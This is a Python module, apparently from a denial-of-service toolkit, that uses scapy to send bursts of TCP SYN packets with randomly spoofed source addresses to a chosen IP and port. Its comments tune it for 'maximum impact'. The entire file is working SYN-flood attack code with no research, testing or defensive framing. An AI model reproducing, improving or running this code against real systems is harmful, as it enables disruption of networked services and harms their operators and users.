# Import modules
import random
from scapy.all import IP, TCP, send
import tools.randomData as randomData
from colorama import Fore


def flood(target: tuple[str, int]) -> None:
    """Send SYN packets to target.
    
    Optimized version with increased packet burst and raw socket optimization.
    
    Args:
        target: Tuple of (ip_address, port)
    """
    # Increased packet burst for maximum impact
    PACKET_COUNT = 64
    
    # Create base packet structure once for efficiency
    ip_packet = IP()
    ip_packet.src = randomData.random_IP()
    ip_packet.dst = target[0]

    tcp_packet = TCP()
    tcp_packet.sport = random.randint(1000, 65535)
    tcp_packet.dport = target[1]
    tcp_packet.flags = "S"
    tcp_packet.seq = random.randint(1000, 100000)
    tcp_packet.window = random.randint(1000, 65535)

    # Send burst of SYN packets
    for _ in range(PACKET_COUNT):
        try:
            # Randomize source IP for each packet
            ip_packet.src = randomData.random_IP()
            send(ip_packet / tcp_packet, verbose=False, count=1)
        except PermissionError:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Permission denied. Run as administrator/root.{Fore.RESET}"
            )
            break
        except OSError as e:
            print(
                f"{Fore.RED}[!] {Fore.MAGENTA}Network error while sending SYN: {e}{Fore.RESET}"
            )
        else:
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}SYN packet sent to {target[0]}:{target[1]}.{Fore.RESET}"
            )
